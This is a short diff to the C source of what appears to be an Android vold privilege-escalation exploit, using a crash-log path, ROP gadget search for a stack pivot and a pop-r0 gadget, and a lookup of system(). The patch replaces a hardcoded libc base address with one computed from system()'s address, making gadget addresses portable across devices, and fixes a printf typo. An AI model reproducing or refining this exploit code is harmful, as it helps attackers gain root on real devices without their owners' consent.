@@ -45,6 +45,7 @@ static char *crashlog = "/data/local/tmp/crashlog";
 static char *vold = "/system/bin/vold";
 
 uint32_t heap_addr;
+uint32_t libc_base;
 uint32_t stack_addr = 0x41414141;
 uint32_t system_ptr = 0;
 uint32_t stack_pivot = 0x41414141;
@@ -183,7 +184,7 @@ static int do_fault()
 	strcpy(padding, "LORDZZZZzzzz");
 	if(padding_sz > 0) {
 		memset(padding+12, 'Z', padding_sz);
-		printf("[*] Poping %d more zerglings\n", padding_sz);
+		printf("[*] Popping %d more zerglings\n", padding_sz);
 	}
 	else if(padding_sz < 0) {
 		memset(padding, 0, 128);
@@ -259,7 +260,7 @@ static int find_rop_gadgets()
 			if(r[1] == '\xb0') {
 				n = read(fd, d, 2);
 				if(d[0] == '\xf0' && d[1] == '\xbd') {
-					stack_pivot = 0xafd00000 + lseek(fd, 0, SEEK_CUR) - 4 + 1;
+					stack_pivot = libc_base + lseek(fd, 0, SEEK_CUR) - 4 + 1;
 					if(check_addr(stack_pivot) == -1)
 						stack_pivot = 0x41414141;
 				}
@@ -267,7 +268,7 @@ static int find_rop_gadgets()
 			break;
 		case '\x01':
 			if(r[1] == '\xbd') {
-				pop_r0 = 0xafd00000 + lseek(fd, 0, SEEK_CUR) - 2 + 1;
+				pop_r0 = libc_base + lseek(fd, 0, SEEK_CUR) - 2 + 1;
 				if(check_addr(pop_r0) == -1)
 					pop_r0 = 0x41414141;
 			}
@@ -434,6 +435,7 @@ int main(int argc, char **argv, char **env)
 	}
 
 	system_ptr = (uint32_t) find_symbol("system");
+	libc_base = system_ptr & 0xfff00000;
 
 	if (check_addr(system_ptr) == -1) {
 		printf("[-] High templars, we're doomed!\n");
